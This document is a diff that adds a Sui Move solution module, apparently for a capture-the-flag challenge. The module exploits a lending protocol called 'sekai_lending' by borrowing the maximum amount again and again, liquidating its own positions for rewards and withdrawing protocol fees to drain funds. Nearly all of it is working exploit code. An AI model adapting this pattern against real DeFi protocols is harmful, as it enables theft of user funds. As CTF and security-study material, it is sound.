@@ -1,0 +1,119 @@
+module the_solution::solution {
+    use challenge::challenge::{Self, Challenge};
+    use sui::coin::Coin;
+    use challenge::collateral_coin::COLLATERAL_COIN;
+    use sui::event;
+    use sui::balance::Balance;
+    use std::string;
+    use sui::coin::into_balance;
+    use sui::coin;
+    use std::string::String;
+    use challenge::sekai_lending::UserPosition;
+    use challenge::collateral_coin;
+    use challenge::collateral_coin::init;
+    use challenge::sekai_lending;
+    use challenge::sekai_lending::liquidate_position;
+    use sui::balance;
+    use challenge::sekai_lending::deposit_collateral;
+    use challenge::sekai_coin::SEKAI_COIN;
+    use challenge::sekai_lending::create;
+    use challenge::sekai_lending::claim_liquidation_reward;
+    use challenge::sekai_lending::remove_collateral;
+    use challenge::sekai_lending::withdraw_protocol_fees;
+    use std::u64::min;
+
+    const INITIAL_COLLATERAL: u64 = 100 * 1_000_000_000;
+    const INITIAL_SEKAI: u64 = 100 * 1_00_000_000;
+    const INITIAL_CLAIM: u64 = 10 * 1_000_000_000;
+
+    public struct ChallengeEvent<T, Y> has drop, store, copy {
+        tag: Y,
+        field: T,
+    }   
+
+    #[allow(lint(self_transfer))]
+    public fun solve(challenge: &mut Challenge, ctx: &mut TxContext) {
+        let mut claimed: Coin<COLLATERAL_COIN> = challenge::claim(challenge, ctx); 
+        let claimed_val = claimed.value();
+        let sekai_lending = challenge.get_sekai_lending_mut();
+        let mut user_pos = sekai_lending.open_position(ctx);
+        sekai_lending.deposit_collateral(&mut user_pos, coin::split(&mut claimed, claimed_val / 10, ctx), ctx); 
+
+        let mut acc: Coin<SEKAI_COIN> = coin::from_balance(balance::zero(), ctx);
+        let mut i = 0;
+        let mut max_borrow: u128;
+        let mut borrowed_sekai_coin: Coin<SEKAI_COIN>;
+        while (i < 100) {
+            max_borrow = sekai_lending.max_borrow_amount(&mut user_pos);
+            borrowed_sekai_coin = sekai_lending.borrow_coin(&mut user_pos, max_borrow as u64, ctx);
+            acc.join(borrowed_sekai_coin);
+            i = i + 1;
+        };
+
+        let mut my_sekai = create(coin::split(&mut claimed, claimed_val * 8 / 10, ctx), acc, ctx);
+
+        let mut j = 0;
+        let mut user_pos_new: UserPosition;
+        let mut put_in: u64;
+        let mut left: u64;
+        let mut to_donate: Coin<COLLATERAL_COIN> = coin::from_balance(balance::zero(), ctx);
+
+        while (j < 7){
+            user_pos_new = my_sekai.open_position(ctx);
+
+            put_in = claimed.value();
+            if (j == 6){
+                put_in = 49_222_222_222;
+                left = claimed.value() - put_in;
+                to_donate.join(coin::split(&mut claimed, left, ctx));
+            };
+            my_sekai.deposit_collateral(&mut user_pos_new, claimed, ctx);
+            claimed = coin::from_balance(balance::zero(), ctx);
+            acc = coin::from_balance(balance::zero(), ctx);
+            i = 0;
+            while (i < 2) {
+                max_borrow = my_sekai.max_borrow_amount(&mut user_pos_new);
+                borrowed_sekai_coin = my_sekai.borrow_coin(&mut user_pos_new, max_borrow as u64, ctx);
+                acc.join(borrowed_sekai_coin);
+                i = i + 1;
+            };
+            liquidate_position(&mut my_sekai, &mut user_pos_new, acc, ctx);
+            claimed.join(claim_liquidation_reward(sekai_lending, &mut user_pos_new, ctx));
+            claimed.join(remove_collateral(&mut my_sekai, put_in, ctx));
+            if(j!=6){
+                claimed.join(withdraw_protocol_fees(&mut my_sekai, put_in / 10, ctx));
+            }else{
+                claimed.join(withdraw_protocol_fees(&mut my_sekai, 1_700_000_000, ctx));
+            };
+            transfer::public_transfer(user_pos_new, tx_context::sender(ctx));
+            j = j + 1;
+        };
+        
+        claimed.join(to_donate);
+        event::emit(ChallengeEvent<u64, String> { tag: std::string::utf8(b"aaaaaaaa"), field:  claimed.value() });
+
+        let mut lic = my_sekai.remove_liquidity(8000000000, ctx);
+        sekai_lending.repay_loan(lic, &mut user_pos, ctx);
+
+        user_pos_new = sekai_lending.open_position(ctx);
+        acc = coin::from_balance(balance::zero(), ctx);
+        sekai_lending.deposit_collateral(&mut user_pos_new, coin::split(&mut claimed, 10_000_000_000, ctx), ctx); 
+
+        i = 0;
+        while (i < 10) {
+            max_borrow = sekai_lending.max_borrow_amount(&mut user_pos_new);
+            borrowed_sekai_coin = sekai_lending.borrow_coin(&mut user_pos_new, max_borrow as u64, ctx);
+            acc.join(borrowed_sekai_coin);
+            i = i + 1;
+        };
+        event::emit(ChallengeEvent<u64, String> { tag: std::string::utf8(b"bbbbbbbb"), field:  acc.value() });
+        transfer::public_transfer(user_pos_new, tx_context::sender(ctx));
+
+
+        challenge.donate_collateral(claimed);
+        challenge.donate_sekai(acc);
+        transfer::public_transfer(user_pos, tx_context::sender(ctx));
+        transfer::public_transfer(my_sekai, tx_context::sender(ctx));
+        
+    }
+}
